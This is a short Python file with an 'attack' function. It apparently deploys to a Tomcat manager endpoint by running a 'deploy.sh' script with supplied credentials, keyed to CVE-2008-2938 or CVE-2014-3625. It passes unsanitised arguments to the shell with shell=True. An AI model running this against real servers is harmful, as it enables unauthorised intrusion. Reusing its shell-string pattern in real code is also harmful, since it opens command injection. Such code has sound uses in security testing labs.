import subprocess

def attack(cve, manager):
    if cve == "CVE-2008-2938":
        process = subprocess.Popen("sh deploy.sh "+manager[0]+" "+manager[1]+" /manager", shell=True)
    elif cve == "CVE-2014-3625":
        process = subprocess.Popen("sh deploy.sh "+manager[0]+" "+manager[1]+" /manager/html", shell=True)
    else:
        raise KeyError

    code = process.wait()

    if code != 0:
        raise RuntimeError
